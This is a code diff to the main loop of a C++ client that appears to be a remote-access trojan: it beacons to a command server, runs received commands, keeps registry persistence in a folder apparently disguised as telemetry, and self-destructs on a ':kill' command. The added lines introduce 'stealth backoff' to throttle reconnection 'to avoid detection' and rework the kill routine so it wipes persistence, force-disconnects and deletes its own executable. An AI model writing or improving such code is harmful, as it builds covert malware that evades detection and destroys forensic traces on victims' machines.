@@ -344,11 +344,22 @@ int main() {
         if (!client.Connect()) {
             failed_attempts++;
             LogToFile("client.log", "[-] Connection failed (" + std::to_string(failed_attempts) + "/" + std::to_string(MAX_FAILED_ATTEMPTS) + ") to " + host + ":" + std::to_string(dynamic_port));
-            // Fails: Wait 5 seconds before retrying the fetching
+            
+            // --- STEALTH BACKOFF LOGIC ---
+            // Reduce traffic frequency if the server is persistently offline
+            int sleep_sec = 5;
+            if (failed_attempts >= 20) {
+                LogToFile("client.log", "[!] Extreme failure count. Going dark for 10 minutes to avoid detection.");
+                sleep_sec = 600; // 10 minutes
+            } else if (failed_attempts >= 5) {
+                LogToFile("client.log", "[!] Multiple failures detected. Throttling reconnection to 1 minute.");
+                sleep_sec = 60; // 1 minute
+            }
+
 #ifdef _WIN32
-            Sleep(5000);
+            Sleep(sleep_sec * 1000);
 #else
-            sleep(5);
+            sleep(sleep_sec);
 #endif
             continue; 
         }
@@ -385,27 +396,36 @@ int main() {
 
             LogToFile("client.log", "[*] Received command: " + command);
 
-            // Kill Switch interception
             if (command == ":kill") {
-                LogToFile("client.log", "[!] Received :kill command from server. Initiating self-destruction...");
+                LogToFile("client.log", "[!] Received :kill command from server. Initiating final cleanup...");
                 
+                // 1. Send final status to server
+                SendSecureMessage(ssl, "Agent has successfully wiped registry footprint, deleted executable, and is terminating indefinitely.\n");
+                SendSecureMessage(ssl, "TERMINATED"); 
+                
+#ifdef _WIN32
+                // 2. IMMEDIATE LOCAL CLEANUP (Before possible network hang)
+                LogToFile("client.log", "[*] Removing persistence and releasing lock...");
                 RemovePersistence();
                 
-                SendSecureMessage(ssl, "Agent has successfully wiped registry footprint, deleted executable, and is terminating indefinitely.\n");
-                SendSecureMessage(ssl, "TERMINATED"); // Send CWD message slot as TERMINATED flag
-                LogToFile("client.log", "[+] Self-destruction completed. Agent terminating.");
-                
-                client.Disconnect(); 
+                if (hMutex) {
+                    ReleaseMutex(hMutex);
+                    CloseHandle(hMutex);
+                    hMutex = NULL;
+                }
+#endif
+
+                // 3. FORCE DISCONNECT (Non-blocking)
+                LogToFile("client.log", "[*] Cutting communication channels (Force)...");
+                client.ForceDisconnect(); 
 
 #ifdef _WIN32
-                if (hMutex) CloseHandle(hMutex);
-                
                 char currentExe[MAX_PATH];
                 GetModuleFileNameA(NULL, currentExe, MAX_PATH);
                 
-                LogToFile("client.log", "[!] Initiating final self-deletion of explorer and folder.");
+                LogToFile("client.log", "[!] Handover to Self-Destruction script.");
                 
-                // If we are in the telemetry folder, delete the whole folder
+                // Check if we are in the persistence directory
                 char appDataPath[MAX_PATH];
                 bool isPersistentDir = false;
                 if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath) == S_OK) {
@@ -415,11 +435,14 @@ int main() {
                     }
                 }
 
+                // 4. Handover to cleanup script
                 SelfDelete(currentExe, isPersistentDir);
                 
-                TerminateProcess(GetCurrentProcess(), 0);
-#endif
+                // 5. Final exit
+                ExitProcess(0);
+#else
                 exit(0);
+#endif
             }
 
             // Sleep Switch interception
